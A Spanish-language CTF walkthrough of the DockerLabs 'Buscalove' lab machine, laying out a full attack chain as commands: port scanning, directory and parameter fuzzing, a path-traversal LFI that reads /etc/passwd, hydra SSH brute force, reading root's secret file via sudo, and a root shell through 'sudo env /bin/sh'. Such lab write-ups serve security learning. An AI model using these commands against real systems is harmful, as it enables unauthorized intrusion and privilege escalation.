---
layout: post
title: "Buscalove"
date: 2024-09-06
 14:20:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Buscalove </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

**1\.**  Descubriendo los puertos abiertos y servicios que corren, tenemos el ssh corriendo y el servicio web de apache.

`sudo nmap -p- --open -T5 --min-rate=5000 -sCV -n -Pn 172.18.0.2`

![img](/notas/public/img/dockerlabs/buscalove/nmap.png){:.margin}

**2\.** En la web corre apache por defecto, asi que hacemos un poco de fuzzing web, vemos una ruta wordpress.

`gobuster dir -u http://172.18.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -q`

![img](/notas/public/img/dockerlabs/buscalove/gobuster.png){:.margin}

**3\.** Hacemos otra vez fuzzing ahora dentro de wordpress, encontramos un index.php.

`gobuster dir -u http://172.18.0.2/wordpress/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -q`

`http://172.18.0.2/wordpress/index.php`

![img](/notas/public/img/dockerlabs/buscalove/gobusterwordpress.png){:.margin}

**4\.** Hacemos fuzzing de parametros en busca de un LFI, wfuzz nos reporta un parametro valido.

`wfuzz -c --hc=400 --hl=40 -w /usr/share/wordlists/rockyou.txt 'http://172.18.0.2/wordpress/index.php?FUZZ=../../../../../../etc/passwd'`

![img](/notas/public/img/dockerlabs/buscalove/wfuzz.png){:.margin}

**5\.** Vamos a la web para ver el LFI, presionamos ctrl+u para visualizar mejor, filtro los usuarios disponibles.

`http://172.18.0.2/wordpress/index.php?love=../../../../../../../etc/passwd`

![img](/notas/public/img/dockerlabs/buscalove/codelfi.png){:.margin}

**6\.** Toca hacer fuerza bruta al ssh con los usuarios disponibles, en este caso el que me dio resultado fue el usuario rosa.

`hydra -l rosa -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -t 64`

![img](/notas/public/img/dockerlabs/buscalove/hydra.png){:.margin}

**7\.** Nos conectamos por ssh como usuario rosa.

`ssh rosa@172.18.0.2`

![img](/notas/public/img/dockerlabs/buscalove/sshrosa.png){:.margin}

**8\.** Encuentro un dos binarios que podemos ejecutar como cualquier usuario, revisamos la carpeta de root, vemos que el archivo secreto contiene un hexadecimal.

`sudo -l`

`sudo -u root /usr/bin/ls -la /root/`

`sudo -u root /usr/bin/cat /root/secret.txt`

![img](/notas/public/img/dockerlabs/buscalove/sudolrosa.png){:.margin}

**9\.** Para decodear usamos [cyberchef](https://gchq.github.io/CyberChef/), deducimos que es una contraseña y del otro usuario que tenemos que es pedro.

![img](/notas/public/img/dockerlabs/buscalove/cyberchef.png){:.margin}

**10\.** Migramos al usuario pedro, revisamos los permisos sudo y encontramos un binario con todos los permisos.

`su pedro`

`sudo -l`

![img](/notas/public/img/dockerlabs/buscalove/sudolpedro.png){:.margin}

**11\.** Escalando privilegios a root, revisamos la utilidad de env en [gtfobins](https://gtfobins.github.io/gtfobins/env/#sudo).

`sudo -u root env /bin/sh`

![img](/notas/public/img/dockerlabs/buscalove/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>